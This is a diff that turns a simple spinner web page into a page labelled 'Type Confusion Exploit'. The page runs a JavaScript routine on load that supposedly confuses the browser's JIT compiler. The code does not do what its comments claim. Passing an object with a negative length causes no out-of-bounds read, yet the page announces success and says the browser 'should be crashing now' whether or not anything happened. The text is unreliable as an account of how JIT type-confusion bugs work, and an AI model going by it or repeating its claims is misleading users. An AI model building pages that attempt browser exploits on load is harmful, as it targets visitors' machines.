@@ -1,22 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPU Trigger</title>
-    <style>
-        @keyframes spin {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        #spinner {
-            width: 100px;
-            height: 100px;
-            background-color: blue;
-            animation: spin 1s linear infinite;
-        }
-    </style>
+    <title>Type Confusion Exploit</title>
 </head>
 <body>
-    <h1>Triggering CPU load...</h1>
-    <div id="spinner"></div>
+    <h1>Attempting Type Confusion Exploit...</h1>
+    <pre id="status">Status: Waiting to start...</pre>
+
+    <script>
+        // This is a theoretical exploit. A real-world Type Confusion exploit is highly complex
+        // and requires a deep understanding of the browser's JIT compiler.
+        // The following code is a representation of the techniques involved.
+        
+        // This function will be optimized by the JIT compiler.
+        function optimizeMe(obj, idx) {
+            return obj[idx] + 1;
+        }
+
+        // We will run this function many times to trigger JIT optimization.
+        for (let i = 0; i < 20000; i++) {
+            optimizeMe([1.1], 0);
+        }
+
+        // The core of the exploit: we confuse the optimized function.
+        function exploit() {
+            // We create a new object that looks like an array to the JIT compiler,
+            // but it's not a real array.
+            const confusedObject = {
+                '0': 1337,
+                length: -1 // A negative length is a common bug trigger.
+            };
+
+            // This will try to run the optimized function with our confused object.
+            // The JIT compiler expects an array and will perform a read
+            // outside of the array's bounds, which could lead to a crash.
+            document.getElementById('status').textContent = "Attempting to trigger the bug...";
+            try {
+                optimizeMe(confusedObject, 0);
+            } catch (e) {
+                // If the bug is caught, it will throw a TypeError.
+                document.getElementById('status').textContent = `Exploit failed. Error: ${e.message}`;
+                return;
+            }
+            
+            // If we get here, the JIT might have been confused and the browser
+            // should crash or exhibit a memory corruption bug.
+            document.getElementById('status').textContent = "Exploit successful. The browser should be crashing now.";
+        }
+
+        window.onload = function() {
+            exploit();
+        };
+    </script>
 </body>
 </html>
